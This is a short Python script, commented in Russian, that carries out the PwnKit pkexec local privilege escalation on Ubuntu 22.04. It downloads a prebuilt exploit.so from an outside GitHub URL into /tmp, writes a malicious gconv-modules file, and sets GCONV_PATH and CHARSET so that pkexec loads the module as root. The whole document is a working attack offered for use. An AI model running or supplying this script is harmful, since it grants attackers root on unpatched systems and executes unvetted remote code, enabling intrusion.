#!/usr/bin/env python3
import os, sys, urllib.request, subprocess

# ▼ Замените на ваш URL, где лежит готовый exploit.so (glibc 2.35 x86_64 Ubuntu 22.04)
URL_SO = "https://github.com/MarcusovP/rev/raw/refs/heads/main/exploit.so"

# Рабочие папки
WORKDIR      = "/tmp/pwnkit"
GCONV_DIR    = os.path.join(WORKDIR, "pwnkit")
MODULES_FILE = os.path.join(WORKDIR, "gconv-modules")
SO_PATH      = os.path.join(GCONV_DIR, "exploit.so")

def die(msg):
    print(f"[!] ERROR: {msg}", file=sys.stderr)
    sys.exit(1)

# 1) Подготовка директорий
os.makedirs(GCONV_DIR, exist_ok=True)

# 2) Скачиваем exploit.so
try:
    print("[*] Downloading exploit module…")
    data = urllib.request.urlopen(URL_SO).read()
    with open(SO_PATH, "wb") as f:
        f.write(data)
except Exception as e:
    die(f"cannot download exploit.so: {e}")

# 3) Пишем gconv-модули
with open(MODULES_FILE, "w") as f:
    # UTF-8// – условная кодировка, PWN// – наш модуль
    f.write("module UTF-8// PWN// pwn 2\n")

# 4) Собираем окружение для pkexec
env = os.environ.copy()
env["GCONV_PATH"] = WORKDIR           # где искать модули
env["CHARSET"]    = "PWN"             # заставим pkexec подгрузить наш модуль
env["PATH"]       = GCONV_DIR + os.pathsep + env.get("PATH", "")

# 5) Запускаем pkexec — модуль загрузится под root
print("[*] Launching pkexec…")
subprocess.call(["/usr/bin/pkexec"], env=env)
